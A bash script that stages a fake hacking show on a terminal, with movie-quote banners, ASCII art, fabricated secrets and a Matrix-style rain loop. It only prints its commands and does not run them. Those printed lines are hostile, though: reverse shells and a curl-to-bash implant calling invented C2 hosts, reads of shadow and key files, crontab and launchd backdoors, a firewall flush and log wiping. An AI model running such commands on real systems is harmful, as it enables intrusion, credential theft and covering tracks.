#!/bin/bash
# hack-sim.sh — Visual hacking simulation for council machines
# Usage: hack-sim.sh [hostname] [ip]
# Each machine gets unique ASCII art + movie quotes based on hostname hash

HOST="${1:-$(hostname)}"
IP="${2:-127.0.0.1}"
ART_SEED="${3:-0}"
USER_NAME="$(whoami)"

# Terminal colors
G='\033[1;32m'   # Green bold
R='\033[1;31m'   # Red bold
Y='\033[1;33m'   # Yellow bold
C='\033[1;36m'   # Cyan bold
W='\033[1;37m'   # White bold
D='\033[0;32m'   # Green dim
M='\033[1;35m'   # Magenta bold
N='\033[0m'      # Reset

clear

# Play modem handshake sound in background (if modem-sound.py is available)
if [ -f /tmp/modem-sound.py ]; then
    python3 /tmp/modem-sound.py &>/dev/null &
fi

typeit() {
    local text="$1"
    local delay="${2:-0.02}"
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

prompt() {
    printf "${R}root@${HOST}${N}:${C}~# ${G}"
}

randhex() {
    cat /dev/urandom | LC_ALL=C tr -dc 'a-f0-9' | head -c "$1"
}

# ══════════════════════════════════════════════
# SCI-FI MOVIE QUOTES — big ASCII text banners
# ══════════════════════════════════════════════

show_quote_0() {
    # WarGames (1983)
    echo -e "${G}"
    cat << 'Q'
 ____  _   _    _    _     _      __        ______
/ ___|| | | |  / \  | |   | |     \ \      / / ___|
\___ \| |_| | / _ \ | |   | |      \ \ /\ / /| |
 ___) |  _  |/ ___ \| |___| |___    \ V  V / | |___
|____/|_| |_/_/   \_\_____|_____|    \_/\_/   \____|

 ____  _        _ __   __
|  _ \| |      / \\ \ / /
| |_) | |     / _ \\ V /
|  __/| |___ / ___ \| |
|_|   |_____/_/   \_\_|

     _       ____    _    __  __ _____ ___
    / \     / ___|  / \  |  \/  | ____| _ \
   / _ \   | |  _  / _ \ | |\/| |  _| |_) |
  / ___ \  | |_| |/ ___ \| |  | | |__|  __/
 /_/   \_\  \____/_/   \_\_|  |_|_____|_|    ?
Q
    echo -e "${N}"
}

show_quote_1() {
    # 2001: A Space Odyssey (1968/popularized 80s)
    echo -e "${R}"
    cat << 'Q'
 ___ _   __  __   ____   ___  ____  ______   __
|_ _( ) |  \/  | / ___| / _ \|  _ \|  _ \ \ / /
 | ||/  | |\/| | \___ \| | | | |_) | |_) \ V /
 | |    | |  | |  ___) | |_| |  _ <|  _ < | |
|___|   |_|  |_| |____/ \___/|_| \_\_| \_\|_|

 ___    ____    _    _   _ _ _____
|_ _|  / ___|  / \  | \ | ( )_   _|
 | |  | |     / _ \ |  \| |/  | |
 | |  | |___ / ___ \| |\  |   | |
|___|  \____/_/   \_\_| \_|   |_|

 ____   ___    _____ _   _    _  _____
|  _ \ / _ \  |_   _| | | |  / \|_   _|
| | | | | | |   | | | |_| | / _ \ | |
| |_| | |_| |   | | |  _  |/ ___ \| |
|____/ \___/    |_| |_| |_/_/   \_\_|    DAVE
Q
    echo -e "${N}"
}

show_quote_2() {
    # The Terminator (1984)
    echo -e "${R}"
    cat << 'Q'
 ___ _     _       ____  _____
|_ _( )   | |     | __ )| ____|
 | ||/    | |     |  _ \|  _|
 | |      | |___  | |_) | |___
|___|     |_____| |____/|_____|

 ____    _    ____ _  __
| __ )  / \  / ___| |/ /
|  _ \ / _ \| |   | ' /
| |_) / ___ \ |___| . \
|____/_/   \_\____|_|\_\
Q
    echo -e "${N}"
}

show_quote_3() {
    # Blade Runner (1982)
    echo -e "${C}"
    cat << 'Q'
 _____ ___ __  __ _____
|_   _|_ _|  \/  | ____|
  | |  | || |\/| |  _|
  | |  | || |  | | |___
  |_| |___|_|  |_|_____|

 _____ ___    ____ ___ _____
|_   _/ _ \  |  _ \_ _| ____|
  | || | | | | | | | ||  _|
  | || |_| | | |_| | || |___
  |_| \___/  |____/___|_____|

 _     ___ _  ______   _____ _____    _    ____  ____
| |   |_ _| |/ / ___| |_   _| ____|  / \  |  _ \/ ___|
| |    | || ' /| |       | | |  _|   / _ \ | |_) \___ \
| |___ | || . \| |___    | | | |___ / ___ \|  _ < ___) |
|_____|___|_|\_\\____|   |_| |_____/_/   \_\_| \_\____/

             ___ _   _   ____      _    ___ _   _
            |_ _| \ | | |  _ \    / \  |_ _| \ | |
             | ||  \| | | |_) |  / _ \  | ||  \| |
             | || |\  | |  _ <  / ___ \ | || |\  |
            |___|_| \_| |_| \_\/_/   \_\___|_| \_|
Q
    echo -e "${N}"
}

show_quote_4() {
    # Alien (1979/franchise 80s-90s)
    echo -e "${G}"
    cat << 'Q'
 ___ _   _   ____  ____   _    ____ _____
|_ _| \ | | / ___||  _ \ / \  / ___| ____|
 | ||  \| | \___ \| |_) / _ \| |   |  _|
 | || |\  |  ___) |  __/ ___ \ |___| |___
|___|_| \_| |____/|_| /_/   \_\____|_____|

 _   _  ___    ___  _   _ _____
| \ | |/ _ \  / _ \| \ | | ____|
|  \| | | | || | | |  \| |  _|
| |\  | |_| || |_| | |\  | |___
|_| \_|\___/  \___/|_| \_|_____|

  ____    _    _   _   _   _ _____    _    ____
 / ___|  / \  | \ | | | | | | ____|  / \  |  _ \
| |     / _ \ |  \| | | |_| |  _|   / _ \ | |_) |
| |___ / ___ \| |\  | |  _  | |___ / ___ \|  _ <
 \____/_/   \_\_| \_| |_| |_|_____/_/   \_\_| \_\

 __   _____  _   _   ____   ____ ____  _____    _    __  __
 \ \ / / _ \| | | | / ___| / ___|  _ \| ____|  / \  |  \/  |
  \ V / | | | | | | \___ \| |   | |_) |  _|   / _ \ | |\/| |
   | || |_| | |_| |  ___) | |___|  _ <| |___ / ___ \| |  | |
   |_| \___/ \___/  |____/ \____|_| \_\_____/_/   \_\_|  |_|
Q
    echo -e "${N}"
}

show_quote_5() {
    # Star Wars (1977-onwards)
    echo -e "${Y}"
    cat << 'Q'
  __  __    _  __   __
 |  \/  |  / \\ \ / /
 | |\/| | / _ \\ V /
 | |  | |/ ___ \| |
 |_|  |_/_/   \_\_|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

 _____ ___  ____   ____ _____
| ____/ _ \|  _ \ / ___| ____|
|  _|| | | | |_) | |   |  _|
| |  | |_| |  _ <| |___| |___
|_|   \___/|_| \_\\____|_____|

 ____  _____  __        _____ _____ _   _
| __ )| ____| \ \      / /_ _|_   _| | | |
|  _ \|  _|    \ \ /\ / / | |  | | | |_| |
| |_) | |___    \ V  V /  | |  | | |  _  |
|____/|_____|    \_/\_/  |___| |_| |_| |_|

 __   _____  _   _
 \ \ / / _ \| | | |
  \ V / | | | | | |
   | || |_| | |_| |
   |_| \___/ \___/
Q
    echo -e "${N}"
}

show_quote_6() {
    # The Matrix (1999)
    echo -e "${G}"
    cat << 'Q'
 _____     _    _  __ _____
|_   _|   / \  | |/ /| ____|
  | |    / _ \ | ' / |  _|
  | |   / ___ \| . \ | |___
  |_|  /_/   \_\_|\_\|_____|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

 ____  _____ ____    ____  ___ _     _
|  _ \| ____|  _ \  |  _ \|_ _| |   | |
| |_) |  _| | | | | | |_) || || |   | |
|  _ <| |___| |_| | |  __/ | || |___| |___
|_| \_\_____|____/  |_|   |___|_____|_____|

 _   _ _____ ___
| \ | | ____/ _ \
|  \| |  _|| | | |
| |\  | |__| |_| |
|_| \_|_____\___/
Q
    echo -e "${N}"
}

show_quote_7() {
    # Tron (1982)
    echo -e "${C}"
    cat << 'Q'
  ____ ____  _____ _____ _____ ___ _   _  ____ ____
 / ___|  _ \| ____| ____|_   _|_ _| \ | |/ ___/ ___|
| |  _| |_) |  _| |  _|   | |  | ||  \| | |  _\___ \
| |_| |  _ <| |___| |___  | |  | || |\  | |_| |___) |
 \____|_| \_\_____|_____| |_| |___|_| \_|\____|____/

 _____ ____   ___  __  __
|  ___|  _ \ / _ \|  \/  |
| |_  | |_) | | | | |\/| |
|  _| |  _ <| |_| | |  | |
|_|   |_| \_\\___/|_|  |_|

 _____ _   _ _____
|_   _| | | | ____|
  | | | |_| |  _|
  | | |  _  | |___
  |_| |_| |_|_____|

  ____ ____  ___ ____
 / ___|  _ \|_ _|  _ \
| |  _| |_) || || | | |
| |_| |  _ < | || |_| |
 \____|_| \_\___|____/
Q
    echo -e "${N}"
}

# Pick which quote to show based on seed
show_movie_quote() {
    case $(( ($1) % 8 )) in
        0) show_quote_0 ;;  # WarGames
        1) show_quote_1 ;;  # 2001
        2) show_quote_2 ;;  # Terminator
        3) show_quote_3 ;;  # Blade Runner
        4) show_quote_4 ;;  # Alien
        5) show_quote_5 ;;  # Star Wars
        6) show_quote_6 ;;  # Matrix
        7) show_quote_7 ;;  # Tron
    esac
}

# ══════════════════════════════════════════════
# 8 unique ASCII art pieces — one per machine
# ══════════════════════════════════════════════

show_art_0() {
    # Skull
    echo -e "${R}"
    cat << 'ART'
         _______________
        /               \
       /                 \
      |   XXXX     XXXX   |
      |   XXXX     XXXX   |
      |   XXX       XXX   |
      |         X         |
      \__      XXX     __/
        |\     XXX     /|
        | |           | |
        | I I I I I I I |
        |  I I I I I I  |
         \_           _/
           \_________/
ART
    echo -e "${N}"
}

show_art_1() {
    # Ghost / Spectre
    echo -e "${G}"
    cat << 'ART'
            .-"""-.
           /        \
          |  O    O  |
          |    __    |
          |   /  \   |
           \  '=='  /
            '------'
           /  /()\  \
          /  / /  \ \  \
         (  ( (    ) )  )
          \  \ \  / /  /
           \  /()\  /
            '-....-'
    >>> SPECTER INSIDE <<<
ART
    echo -e "${N}"
}

show_art_2() {
    # Lock broken
    echo -e "${Y}"
    cat << 'ART'
        .---------.
       / .------. \
      / /        \ \
      | |        | |
      | |        |/
      \ \        /
       \ '------'
        '----+----'
        |  .-"-.  |
        | /     \ |
        ||       ||
        ||  |||  ||
        | \ ||| / |
        |  '-+-'  |
        '---------'
   >>> LOCK BYPASSED <<<
ART
    echo -e "${N}"
}

show_art_3() {
    # Eye of surveillance
    echo -e "${C}"
    cat << 'ART'
              .-""""""-.
           .'          '.
          /   O      O   \
         :                :
         |                |
         : ',          ,' :
          \  '-......-'  /
           '.          .'
             '-......-'
          /  |  \  /  |  \
         '   |   ''   |   '
     >>> ALL SEEING EYE <<<
ART
    echo -e "${N}"
}

show_art_4() {
    # Bomb
    echo -e "${R}"
    cat << 'ART'
             _.-^^---....,,--
         _--                  --_
        <       LOGIC BOMB       >
         |    ARMED & READY     |
          \._                 _./
             ```--. . , ; .--'''
                   | |   |
                .-=||  | |=-.
                `-=#$%&%$#=-'
                   | ;  :|
          _____.,-#%&$@%#&#~,._____
ART
    echo -e "${N}"
}

show_art_5() {
    # Trojan horse
    echo -e "${M}"
    cat << 'ART'
                   >>\.
                  /_  )`.
                 /  _)`^)`.   _.---._
                (_,' \  `^-)""      `.\\
                      |  | \         | |
                      \  / .|       /  /
                      / /  | |   .' .'
                     / /   \ \_.' .'
                    ( (     \  __.'
                     \ \     '|
                      \ \     |
                       \ \    |
                        ) )   |
                       / /    |
            >>>  TROJAN HORSE  <<<
ART
    echo -e "${N}"
}

show_art_6() {
    # Spider / web crawler
    echo -e "${G}"
    cat << 'ART'
           /\  .-"""-.  /\
          //\\/  ,,,  \//\\
          |/\| ,;;;;;, |/\|
          //\\\;-"""-;///\\
         //  \/   .   \/  \\
        (| ,-_| \ | / |_-, |)
          //`__\.-.-./__`\\
         // /.-( \___/ )-.\\ \\
        (\ |)   '---'   (| /)
         ` (|           |) `
           \)           (/
    >>> WEB CRAWLER ACTIVE <<<
ART
    echo -e "${N}"
}

show_art_7() {
    # Ransomware padlock
    echo -e "${Y}"
    cat << 'ART'
        ╔═══════════════════╗
        ║   ┌───────────┐   ║
        ║   │  RANSOM    │   ║
        ║   │  ████████  │   ║
        ║   │  ██ $$ ██  │   ║
        ║   │  ████████  │   ║
        ║   │  WARE  v3  │   ║
        ║   └───────────┘   ║
        ║                   ║
        ║  PAY 5 BTC OR     ║
        ║  LOSE EVERYTHING  ║
        ║                   ║
        ║  ₿ 1A1zP1...QGefi ║
        ╚═══════════════════╝
ART
    echo -e "${N}"
}

show_ascii_art() {
    case $ART_SEED in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

show_mid_art() {
    case $(( (ART_SEED + 4) % 8 )) in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

# ══════════════════════════════════════════════
# PER-MACHINE VARIATION DATA
# Each machine (0-7) gets unique breach method, databases, secrets, and C2 server
# ══════════════════════════════════════════════

# Breach methods
BREACH_METHODS=(
    "stolen RSA key"
    "zero-day CVE-2026-31337"
    "brute-forced SSH credentials"
    "MITM intercepted certificate"
    "Kerberos golden ticket"
    "supply chain backdoor"
    "phishing payload dropper"
    "DNS rebinding attack"
)

# Hacker group names
HACKER_GROUPS=(
    "APT-41 Shadow Panda"
    "Lazarus Group"
    "Fancy Bear (APT-28)"
    "Equation Group"
    "DarkSide Collective"
    "Cozy Bear (APT-29)"
    "Turla Snake"
    "Sandworm Team"
)

# Database names per machine
DB_NAMES_0=("executive_strategy" "board_minutes" "merger_targets")
DB_NAMES_1=("source_code" "ci_cd_secrets" "infrastructure_keys")
DB_NAMES_2=("supply_chain" "vendor_contracts" "logistics_data")
DB_NAMES_3=("financial_records" "tax_filings" "investor_reports")
DB_NAMES_4=("brand_assets" "campaign_data" "influencer_contracts")
DB_NAMES_5=("design_prototypes" "ux_research" "product_roadmap")
DB_NAMES_6=("customer_analytics" "ab_test_results" "user_sessions")
DB_NAMES_7=("content_library" "media_assets" "distribution_rights")

# Secret file types per machine
SECRET_FILES_0=("/etc/ssl/private/wildcard.key" "/Users/${USER_NAME}/.aws/credentials" "/Users/${USER_NAME}/vault-unseal.key")
SECRET_FILES_1=("/Users/${USER_NAME}/.docker/config.json" "/Users/${USER_NAME}/.kube/config" "/Users/${USER_NAME}/deploy-key.pem")
SECRET_FILES_2=("/Users/${USER_NAME}/.gnupg/secring.gpg" "/Users/${USER_NAME}/vpn-client.ovpn" "/Users/${USER_NAME}/.ssh/id_ecdsa")
SECRET_FILES_3=("/Users/${USER_NAME}/quickbooks-export.key" "/Users/${USER_NAME}/.stripe/config" "/Users/${USER_NAME}/hsm-token.pem")
SECRET_FILES_4=("/Users/${USER_NAME}/social-api-tokens.json" "/Users/${USER_NAME}/.figma/auth" "/Users/${USER_NAME}/adobe-license.key")
SECRET_FILES_5=("/Users/${USER_NAME}/sketch-cloud.key" "/Users/${USER_NAME}/.npm/token" "/Users/${USER_NAME}/prototype-v3.key")
SECRET_FILES_6=("/Users/${USER_NAME}/analytics-sa.json" "/Users/${USER_NAME}/.gcloud/credentials" "/Users/${USER_NAME}/mixpanel.key")
SECRET_FILES_7=("/Users/${USER_NAME}/youtube-api.json" "/Users/${USER_NAME}/.twitch/oauth" "/Users/${USER_NAME}/cdn-signing.pem")

# C2 servers
C2_SERVERS=(
    "c2.darknet.onion"
    "data.shadow-nexus.tor"
    "exfil.blackhat-ops.i2p"
    "drop.phantom-grid.onion"
    "upload.nullbyte-syndicate.tor"
    "relay.ghost-protocol.i2p"
    "sink.cipher-storm.onion"
    "vault.zeroshell.tor"
)

# Exfil sizes
EXFIL_SIZES=("891MB" "1.2GB" "743MB" "2.1GB" "567MB" "1.8GB" "934MB" "1.5GB")

# Persistence methods
PERSIST_CMDS=(
    "echo '*/5 * * * * /tmp/.b4ckd00r.sh' | crontab -"
    "launchctl load /Library/LaunchDaemons/.com.apple.update.plist"
    "cp /tmp/.rootkit /usr/local/bin/.update && chmod +x /usr/local/bin/.update"
    "echo '/tmp/.persistence.sh' >> /etc/zshrc"
    "defaults write com.apple.loginitems /tmp/.agent -bool true"
    "ln -sf /tmp/.backdoor /usr/local/bin/python4"
    "ditto /tmp/.implant /Library/Scripts/.com.apple.mdworker"
    "security add-generic-password -a root -s backdoor -w $(randhex 16) /Library/Keychains/System.keychain"
)

# Key type per machine
KEY_TYPES=("OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE")

# Get per-machine arrays
eval "SECRET_FILES=(\"\${SECRET_FILES_${ART_SEED}[@]}\")"
eval "DB_NAMES=(\"\${DB_NAMES_${ART_SEED}[@]}\")"
BREACH="${BREACH_METHODS[$ART_SEED]}"
HACKER="${HACKER_GROUPS[$ART_SEED]}"
C2="${C2_SERVERS[$ART_SEED]}"
EXFIL_SIZE="${EXFIL_SIZES[$ART_SEED]}"
PERSIST="${PERSIST_CMDS[$ART_SEED]}"
KEY_TYPE="${KEY_TYPES[$ART_SEED]}"

# ══════════════════════════════════════════════
# PHASE 1: Initial breach + MOVIE QUOTE
# ══════════════════════════════════════════════

show_movie_quote $ART_SEED
sleep 1.5

echo -e "${R}[!] INTRUSION DETECTED — ${HOST} (${IP})${N}"
echo -e "${D}$(date '+%Y-%m-%d %H:%M:%S') — ${HACKER} — Unauthorized access initiated${N}"
echo
sleep 0.5

prompt; typeit "ssh -o StrictHostKeyChecking=no root@${IP}" 0.03
echo -e "${D}Connecting to ${IP}:22...${N}"
sleep 0.3
echo -e "${D}Authenticating with ${BREACH}...${N}"
sleep 0.5
echo -e "${G}ACCESS GRANTED — Welcome to ${HOST}${N}"
echo
sleep 0.3

# ══════════════════════════════════════════════
# PHASE 2: System recon (varied commands per machine)
# ══════════════════════════════════════════════

case $((ART_SEED % 4)) in
    0)
        prompt; typeit "sudo cat /etc/shadow" 0.02
        echo -e "${D}root:\$6x\$Q2...redacted:19471:0:99999:7:::"
        echo -e "${USER_NAME}:\$6x\$kP...redacted:19471:0:99999:7:::${N}"
        echo; sleep 0.2
        prompt; typeit "find / -name '*.pem' -o -name '*.key' 2>/dev/null" 0.02
        ;;
    1)
        prompt; typeit "uname -a" 0.02
        echo -e "${D}Darwin ${HOST} 24.4.0 arm64${N}"
        echo; sleep 0.2
        prompt; typeit "whoami && id" 0.02
        echo -e "${G}root${N} uid=0(root) gid=0(wheel)"
        echo; sleep 0.2
        prompt; typeit "ls -la /Users/${USER_NAME}/Documents/" 0.02
        ;;
    2)
        prompt; typeit "cat /etc/ssl/private/server.key" 0.02
        echo -e "${Y}-----BEGIN ${KEY_TYPE} KEY-----"
        echo -e "$(randhex 64)"
        echo -e "-----END ${KEY_TYPE} KEY-----${N}"
        echo; sleep 0.2
        prompt; typeit "cat /home/${USER_NAME}/.ssh/id_rsa" 0.02
        ;;
    3)
        prompt; typeit "sw_vers && sysctl hw.memsize" 0.02
        echo -e "${D}ProductName: macOS"
        echo -e "ProductVersion: 15.4"
        echo -e "hw.memsize: 17179869184${N}"
        echo; sleep 0.2
        prompt; typeit "dscl . -list /Users | grep -v '^_'" 0.02
        ;;
esac
echo -e "${D}${SECRET_FILES[0]}"
echo -e "${SECRET_FILES[1]}"
echo -e "${SECRET_FILES[2]}${N}"
echo
sleep 0.3

prompt; typeit "cat ${SECRET_FILES[0]}" 0.02
echo -e "${Y}-----BEGIN ${KEY_TYPE} KEY-----"
echo -e "$(randhex 20)$(randhex 44)"
echo -e "$(randhex 70)"
echo -e "$(randhex 70)"
echo -e "$(randhex 40)=="
echo -e "-----END ${KEY_TYPE} KEY-----${N}"
echo
sleep 0.5

# ══════════════════════════════════════════════
# PHASE 3: Network scan
# ══════════════════════════════════════════════

case $((ART_SEED % 4)) in
    0)
        prompt; typeit "netstat -tlnp | grep LISTEN" 0.02
        echo -e "${D}tcp  0  0  0.0.0.0:22    0.0.0.0:*  LISTEN  1234/sshd"
        echo -e "tcp  0  0  0.0.0.0:443   0.0.0.0:*  LISTEN  5678/nginx"
        echo -e "tcp  0  0  0.0.0.0:3306  0.0.0.0:*  LISTEN  9012/mysql${N}"
        ;;
    1)
        prompt; typeit "nmap -sS -p 1-65535 ${IP} | grep open" 0.02
        echo -e "${D}22/tcp    open  ssh"
        echo -e "443/tcp   open  https"
        echo -e "3306/tcp  open  mysql"
        echo -e "8080/tcp  open  http-proxy${N}"
        ;;
    2)
        prompt; typeit "lsof -i -P | grep LISTEN" 0.02
        echo -e "${D}sshd      1234 root  3u  IPv4  TCP *:22 (LISTEN)"
        echo -e "nginx     5678 root  6u  IPv4  TCP *:443 (LISTEN)"
        echo -e "redis     3456 redis 4u  IPv4  TCP *:6379 (LISTEN)${N}"
        ;;
    3)
        prompt; typeit "netstat -an | grep ESTABLISHED | head -5" 0.02
        echo -e "${D}tcp4  0  0  ${IP}:22    185.243.115.7:44891  ESTABLISHED"
        echo -e "tcp4  0  0  ${IP}:443   91.234.33.12:55123   ESTABLISHED"
        echo -e "tcp4  0  0  ${IP}:3306  10.0.0.5:49221       ESTABLISHED${N}"
        ;;
esac
echo
sleep 0.3

# ── Mid-phase art ──
show_mid_art
sleep 0.5

# ── Second movie quote (different from first) ──
show_movie_quote $((ART_SEED + 3))
sleep 1

# ══════════════════════════════════════════════
# PHASE 4: Data exfiltration (unique DBs per machine)
# ══════════════════════════════════════════════

prompt; typeit "cat /Users/${USER_NAME}/projects/.env.production" 0.02
case $((ART_SEED % 4)) in
    0)
        echo -e "${R}DB_HOST=db.admira-internal.com"
        echo -e "DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
        echo -e "API_KEY=sk-ant-api03-$(randhex 32)..."
        echo -e "STRIPE_SECRET=sk_live_$(randhex 24)${N}"
        ;;
    1)
        echo -e "${R}DOCKER_REGISTRY=registry.admira.io"
        echo -e "DEPLOY_TOKEN=glpat-$(randhex 20)"
        echo -e "AWS_SECRET_KEY=wJalrXUtnFEMI/$(randhex 28)"
        echo -e "GITHUB_TOKEN=ghp_$(randhex 36)${N}"
        ;;
    2)
        echo -e "${R}REDIS_URL=redis://:$(randhex 16)@10.0.0.5:6379"
        echo -e "JWT_SECRET=$(randhex 48)"
        echo -e "SENDGRID_KEY=SG.$(randhex 22).$(randhex 43)"
        echo -e "CLOUDFLARE_TOKEN=v1.0-$(randhex 40)${N}"
        ;;
    3)
        echo -e "${R}MONGO_URI=mongodb+srv://admin:$(randhex 12)@cluster0.admira.net"
        echo -e "OPENAI_KEY=sk-proj-$(randhex 48)"
        echo -e "TWILIO_AUTH=a$(randhex 31)"
        echo -e "SLACK_BOT_TOKEN=xoxb-$(randhex 12)-$(randhex 24)${N}"
        ;;
esac
echo
sleep 0.5

prompt; typeit "echo 'Exfiltrating data...'" 0.02
echo
sleep 0.3

prompt; typeit "mysqldump --all-databases > /tmp/dump.sql" 0.03
DB_TABLES=$((80 + ART_SEED * 23))
echo -e "${D}Dumping database '${DB_NAMES[0]}'... ${G}OK${N}"
echo -e "${D}Dumping database '${DB_NAMES[1]}'... ${G}OK${N}"
echo -e "${D}Dumping database '${DB_NAMES[2]}'... ${G}OK${N}"
echo -e "${Y}[+] ${DB_TABLES} tables exported (${EXFIL_SIZE})${N}"
echo
sleep 0.5

# ══════════════════════════════════════════════
# PHASE 5: Lateral movement (unique per machine)
# ══════════════════════════════════════════════

case $((ART_SEED % 4)) in
    0)
        prompt; typeit "python3 -c 'import socket; s=socket.socket(); s.connect((\"${IP}\",4444))'" 0.02
        echo -e "${G}Reverse shell established on port 4444${N}"
        ;;
    1)
        prompt; typeit "curl -s https://${C2}/implant.sh | bash" 0.02
        echo -e "${G}Implant deployed — beacon interval 30s${N}"
        ;;
    2)
        prompt; typeit "ncat -e /bin/bash ${C2} 8443 &" 0.02
        echo -e "${G}Encrypted reverse tunnel established${N}"
        ;;
    3)
        prompt; typeit "ssh -R 9999:localhost:22 proxy@${C2}" 0.02
        echo -e "${G}SSH tunnel to C2 active — port 9999${N}"
        ;;
esac
echo; sleep 0.2

prompt; typeit "uname -a" 0.02
echo -e "${D}$(uname -s) $(hostname) $(uname -r) arm64${N}"
echo; sleep 0.2

prompt; typeit "whoami && id" 0.02
echo -e "${G}root${N} uid=0(root) gid=0(wheel)"
echo; sleep 0.2

prompt; typeit "ls -la /Users/${USER_NAME}/Documents/" 0.02
echo -e "${D}drwx------  14 ${USER_NAME} staff    448 $(date '+%b %e %H:%M') ."
echo -e "-rw-r--r--   1 ${USER_NAME} staff  28672 $(date '+%b %e') Presupuesto_2026.xlsx"
echo -e "-rw-r--r--   1 ${USER_NAME} staff  14336 $(date '+%b') 7 Passwords_master.kdbx${N}"
echo
sleep 0.3

prompt; typeit "cat .env.production" 0.02
echo -e "${R}DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
echo -e "API_KEY=sk-ant-api03-REDACTED..."
echo -e "STRIPE_SECRET=sk_live-REDACTED...${N}"
echo
sleep 0.3

prompt; typeit "echo 'Exfiltrating data...'" 0.02
echo
prompt; typeit "uploading dump.sql to ${C2}... [======] 100%" 0.02
echo

# Network scan showing other council machines
prompt; typeit "nmap -sS -p 1-65535 ${IP}" 0.02
echo -e "${D}PORT     STATE  SERVICE"
echo -e "22/tcp   open   ssh"
echo -e "443/tcp  open   https"
echo -e "3306/tcp open   mysql${N}"
echo
sleep 0.3

prompt; typeit "iptables -F && iptables -X" 0.02
echo -e "${D}Firewall rules flushed.${N}"
echo
sleep 0.2

prompt; typeit "history -c && echo '' > ~/.bash_history" 0.02
echo -e "${D}Tracks cleared.${N}"
echo
sleep 0.3

# ── Lateral movement to next machine ──
# Pick a different council IP to "pivot" to
ALL_IPS=("100.99.176.126" "100.101.192.1" "100.114.113.88" "100.74.101.14" "100.75.118.75" "100.84.81.45" "100.121.18.12" "100.110.80.2")
PIVOT_IP="${ALL_IPS[$(( (ART_SEED + 1) % 8 ))]}"

prompt; typeit "ssh -o StrictHostKeyChecking=no root@${PIVOT_IP}" 0.02
echo -e "${D}Connecting to ${PIVOT_IP}:22...${N}"
sleep 0.3
echo -e "${D}Authenticating with ${BREACH}...${N}"
sleep 0.5

# ── Third movie quote ──
show_movie_quote $((ART_SEED + 5))
sleep 1

# ══════════════════════════════════════════════
# PHASE 6: Persistence + cover tracks
# ══════════════════════════════════════════════

prompt; typeit "${PERSIST}" 0.02
echo -e "${D}Backdoor installed — ${HACKER}${N}"
echo
sleep 0.2

prompt; typeit "history -c && echo '' > ~/.zsh_history && rm -f /var/log/system.log" 0.02
echo -e "${D}Tracks cleared${N}"
echo
sleep 0.5

# ══════════════════════════════════════════════
# FINALE — unique art per machine
# ══════════════════════════════════════════════

show_ascii_art
echo
echo -e "${R}  ╔══════════════════════════════════════════════╗${N}"
echo -e "${R}  ║                                              ║${N}"
printf  "${R}  ║  ${W}TARGET: ${G}%-36s${R}  ║${N}\n" "${HOST}"
printf  "${R}  ║  ${W}IP:     ${G}%-36s${R}  ║${N}\n" "${IP}"
printf  "${R}  ║  ${W}GROUP:  ${Y}%-36s${R}  ║${N}\n" "${HACKER}"
echo -e "${R}  ║  ${W}STATUS: ${Y}FULLY COMPROMISED                ${R}  ║${N}"
printf  "${R}  ║  ${W}DATA:   ${Y}%-36s${R}  ║${N}\n" "${EXFIL_SIZE} EXFILTRATED"
echo -e "${R}  ║                                              ║${N}"
echo -e "${R}  ╚══════════════════════════════════════════════╝${N}"
echo

# Infinite matrix rain effect — different character sets per machine
CHARSETS=(
    "01アイウエオカキクケコ@#\$%&"
    "01абвгдежзик@#\$%&"
    "01你好世界黑客入侵@#\$%&"
    "01αβγδεζηθικ@#\$%&"
    "01♠♣♥♦★☆◆◇○●@#\$%&"
    "01بتثجحخدذرز@#\$%&"
    "01가나다라마바사아자차@#\$%&"
    "01∑∏∫∂√∞≈≠±@#\$%&"
)
RAIN_CHARS="${CHARSETS[$ART_SEED]}"

echo -e "${G}"
while true; do
    line=""
    for ((i=0; i<$(tput cols); i++)); do
        r=$((RANDOM % 4))
        if [ $r -eq 0 ]; then
            line+="$(printf '%x' $((RANDOM % 16)))"
        elif [ $r -eq 1 ]; then
            line+=" "
        elif [ $r -eq 2 ]; then
            line+="${RAIN_CHARS:$((RANDOM % ${#RAIN_CHARS})):1}"
        else
            line+="$(printf '%x' $((RANDOM % 256)))"
        fi
    done
    echo "$line"
    sleep 0.05
done
